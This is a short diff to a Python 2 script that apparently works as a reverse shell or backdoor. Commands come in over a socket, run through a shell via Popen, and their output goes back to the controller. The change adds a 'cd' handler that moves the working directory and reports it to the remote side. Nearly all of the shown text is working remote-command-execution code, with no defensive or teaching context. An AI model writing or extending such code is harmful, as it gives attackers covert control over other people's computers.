@@ -32,6 +32,10 @@ def connect():
             except Exception, e:
                 s.send(str(e))
                 pass
+        elif 'cd' in command:
+            code,directory = command.split(' ')
+            os.chdir(directory)
+            s.send("[+] CWD Is " + os.getcwd())
         else:
             CMD = Popen(command, shell=True, stdin=PIPE, stderr=PIPE, stdout=PIPE)
             s.send(CMD.stdout.read())
